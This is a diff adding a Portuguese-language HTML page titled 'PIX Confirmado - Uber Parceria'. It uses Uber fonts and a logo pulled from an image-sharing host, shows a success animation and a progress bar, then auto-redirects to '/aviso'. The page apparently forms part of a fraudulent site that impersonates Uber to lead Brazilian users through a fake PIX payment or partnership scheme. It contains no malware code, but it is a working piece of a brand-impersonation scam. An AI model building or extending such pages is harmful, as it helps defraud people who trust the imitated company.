@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIX Confirmado - Uber Parceria</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link href="/static/css/uber-fonts.css" rel="stylesheet">
+    <style>
+        * {
+            font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+        }
+        
+        body {
+            background: #000;
+            color: #fff !important;
+        }
+        
+        /* Force all text to white */
+        *, *::before, *::after {
+            color: #fff !important;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.05);
+            padding: 40px;
+            border-radius: 12px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #00D494;
+            margin-bottom: 20px;
+            animation: successPulse 2s infinite;
+        }
+        
+        @keyframes successPulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+        
+        h1 {
+            margin-bottom: 20px;
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .redirect-btn {
+            background: #fff;
+            color: #000;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            font-family: "UberMoveText", sans-serif !important;
+        }
+        
+        .redirect-btn:hover {
+            background: #f0f0f0;
+            transform: translateY(-2px);
+        }
+        
+        .uber-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #333;
+            border-top: 3px solid #00D494;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.8s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-5">
+    <div class="container text-center fade-in">
+        <!-- Logo Uber oficial -->
+        <div class="mb-8">
+            <img src="https://i.ibb.co/wFFn5HSn/13093103960002-1.png" alt="Uber" class="h-16 mx-auto">
+        </div>
+        
+        <!-- Progress Bar -->
+        <div class="w-64 mx-auto">
+            <div class="bg-gray-700 rounded-full h-2">
+                <div id="progress-bar" class="bg-white h-2 rounded-full transition-all duration-4000" style="width: 0%"></div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Load Uber fonts
+        document.addEventListener('DOMContentLoaded', function() {
+            const style = document.createElement('style');
+            style.textContent = `
+                * {
+                    font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+                }
+            `;
+            document.head.appendChild(style);
+        });
+        
+        // Animate progress bar
+        setTimeout(() => {
+            document.getElementById('progress-bar').style.width = '100%';
+        }, 100);
+        
+        // Redirecionamento automático em 4 segundos
+        setTimeout(() => {
+            window.location.href = '/aviso';
+        }, 4000);
+    </script>
+</body>
+</html>
